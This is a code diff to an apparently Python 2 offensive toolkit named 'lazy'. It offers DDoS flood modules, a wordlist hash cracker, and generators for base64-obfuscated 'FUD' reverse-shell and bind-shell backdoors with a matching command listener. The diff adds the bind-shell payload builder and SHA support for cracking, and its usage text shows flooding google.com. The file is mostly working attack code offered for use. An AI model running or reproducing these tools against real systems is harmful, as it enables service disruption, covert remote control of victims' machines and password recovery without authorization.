@@ -1,12 +1,12 @@
 import os.path
-scs = {'ddos':['flood/http','flood/tcp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell']}
+scs = {'ddos':['flood/http','flood/tcp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell']}
 opt1 = ''
 opt2 = ''
 infos = {'flood/http':
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/tcp':
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
 	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
-	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
+	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2
 }
 def options(script,_opt1,_opt2):
 	global opt1
@@ -35,11 +35,40 @@ def floodhttp(host,port):
 			break
 def usage():
 	print '# Usage ex:'
-	print '  lazy# use 1'
-	print '  lazy/ddos# set_script flood/http'
-	print '  lazy/ddos/flood/http# set host=google.com'
-	print '  lazy/ddos/flood/http# set port=80'
-	print '  lazy/ddos/flood/http# run\n'
+	print '''
+(print available modules)>> lazy# modules
+[1]     ddos
+[2]     bruteforce
+[3]     payloads
+
+(select module to use [by number])>> lazy# use 1
+
+(print available scripts for the modules)>> lazy/ddos# scripts
+[+]flood/http
+[+]flood/tcp
+[+]flood/udp
+
+(select script to use)>> lazy/ddos# set_script flood/http
+
+(print options for selected script)>> lazy/ddos/flood/http# options
+Options:
+host .... target to attack
+port .... port to target
+
+(defining the values for options) {
+>> lazy/ddos/flood/http# set host = google.com
+>> lazy/ddos/flood/http# set port = 80
+
+(info)>> lazy/ddos/flood/http# info
+--------------------
+ddos/flood/http:
+[+] host = google.com
+[+] port = 80
+
+(starting the script)>> lazy/ddos/flood/http# run
+[+] Sending request 15300 to google.com:80^C
+>> lazy/ddos/flood/http# back
+>> lazy#\n'''
 	
 def floodtcp(host,port):
 	import socket, random, sys
@@ -71,20 +100,46 @@ def floodudp(host):
 			break
 def hashkiller(wordl, hash):
 	import hashlib, sys
-	wl = open(wordl)
-	rd = wl.readlines()
-	for i in rd:
-		if i.endswith('\n'):
-			i = i.replace('\n','')
-		sys.stdout.write('\r[*] Atual word: %s' %i)
-		sys.stdout.flush()
-		if hashlib.md5(i).hexdigest() == hash:
-			print '\n[+] Hash founded!'
-			print 'Your hash is: %s' % i
-			break
-		else:
-			pass
-	wl.close()
+	hashes = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
+	hashtype = raw_input('[*] Hash type (ex: md5): ').lower()
+	if hashtype in hashes:
+		# verify user input
+		if hashtype == 'md5':
+			crack = hashlib.md5
+
+		if hashtype == 'sha1':
+			crack = hashlib.sha1
+
+		if hashtype == 'sha224':
+			crack = hashlib.sha224
+
+		if hashtype == 'sha256':
+			crack = hashlib.sha256
+
+		if hashtype == 'sha384':
+			crack = hashlib.sha384
+
+		if hashtype == 'sha512':
+			crack = hashlib.sha512
+		# open e read wordlist
+		wl = open(wordl)
+		rd = wl.readlines()
+		for i in rd: # start bruteforce
+			if i.endswith('\n'):
+				i = i.replace('\n','')
+			sys.stdout.write('\r[*] Atual word: %s' %i)
+			sys.stdout.flush()
+			if crack(i).hexdigest() == hash: # check if encoded word is equal the parsed hash
+				print '\n[+] Hash founded!'
+				print 'Your hash is: %s' % i
+				break
+			else:
+				pass # exception
+		wl.close()
+	else:
+		print "{!} '"+hashtype+"' isn't a suported hash type"
+		print "Suported hash types: "
+		print ', '.join(hashes)
 
 def listener():
 	port = int(raw_input('Port to listen at: '))
@@ -101,18 +156,18 @@ def listener():
 			while True:
 				cmd = raw_input('shell# ')
 				c.send(cmd)
-				print c.recv(1024)
+				print c.recv(1024) # response
 		except KeyboardInterrupt:
 			break
 			exit()
 	s.close
 
-def fud_shell(lhost, lport):
+def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
 	pth = raw_input('File name (ex: payload.pyw): ')
-	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(1024)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tconn=" "\n\t\ts.send(conn)\n\telse:\n\t\tcmd = os.popen(conn).read()\n\t\ts.sendall(cmd+"\\n")'
+	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(1024)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tconn=os.getcwd()\n\t\ts.send(conn)\n\telse:\n\t\tcmd = os.popen(conn).read()\n\t\ts.sendall(cmd+"\\n")'
 	_file = open(pth,'w')
 	print '[*] Enconding'
-	enc = payload.encode('base64').replace('\n','')
+	enc = payload.encode('base64').replace('\n','') # encode as base64 
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
 	_file.close()
 	print '[+] File saved as: %s\n' % pth
@@ -120,8 +175,17 @@ def fud_shell(lhost, lport):
 	if quest.lower() == 'y':
 		listener()
 	else:
-		print '[!] Exiting ...\n' 
+		print '[!] Exiting ...\n'
 
+def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
+	pth = raw_input('File name (ex: payload.pyw): ')
+	payload = 'from socket import socket, AF_INET, SOCK_STREAM\\nimport os\\nhost="'+lhost+'"\\nport=int("'+lport+'")\\ns=socket(AF_INET, SOCK_STREAM)\\ns.bind(('',port))\\ns.listen(1)\\nwhile 1:\\n\\ttry:\\n\\t\\tc, addr = s.accept()\\n\\t\\tprint "[+] Connection from", addr\\n\\t\\twhile 1:\\n\\t\\t\\tconn = c.recv(1024)\\n\\t\\t\\tif conn[:2] == "cd":\\n\\t\\t\\t\\tos.chdir(str(conn[3:]))\\n\\t\\t\\t\\tconn = os.getcwd()\\n\\t\\t\\t\\tc.sendall(conn)\\n\\t\\t\\telse:\\n\\t\\t\\t\\tcmd = os.popen(conn).read()\\n\\t\\t\\t\\tc.sendall(cmd+"\n")\\n\\texcept KeyboardInterrupt:\\n\\t\\tbreak'
+	_file = open(pth, 'w')
+	print '[*] Enconding'
+	enc = payload.encode('base64')
+	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
+	_file.close()
+	print '[+] File saved as: %s' % pth
 def run(script, opt1, opt2):
 	if script == 'flood/http':
 		floodhttp(opt1,opt2)
@@ -130,9 +194,11 @@ def run(script, opt1, opt2):
 	if script == 'flood/udp':
 		floodudp(opt1)
 	if script == 'offline/hashkiller':
-		if os.path.isfile(opt1):
-			hashkiller(opt1, opt2)
+		if os.path.isfile(opt2):
+			hashkiller(opt2, opt1)
 		else:
-			print 'Wordlist file dont exist!'
+			print '{!} Wordlist file dont exist!'
 	if script == 'fud/python/reverse_shell':
 		fud_shell(opt1, opt2)
+	if script == 'fud/python/bind_shell':
+		fud_bindshell(opt1, opt2)
